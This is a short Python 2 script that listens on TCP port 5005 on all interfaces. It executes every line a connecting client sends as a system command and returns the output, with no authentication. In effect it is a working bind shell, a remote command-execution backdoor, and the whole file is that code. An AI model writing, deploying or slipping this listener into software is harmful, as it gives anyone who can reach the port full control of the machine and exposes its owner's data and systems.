#!/usr/bin/env python

import socket
import subprocess

TCP_IP = ''
TCP_PORT = 5005
BUFFER_SIZE = 1024  # Normally 1024, but we want fast response

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)

conn, addr = s.accept()
while 1:
    try:
        data = conn.recv(BUFFER_SIZE)
        if not data: break
        proc = subprocess.Popen(data.split(), stdout=subprocess.PIPE)
        data = proc.communicate()[0]
        conn.send(data)  # echo
    except:
        conn.send("Command Failed, Try Again\n")
conn.close()
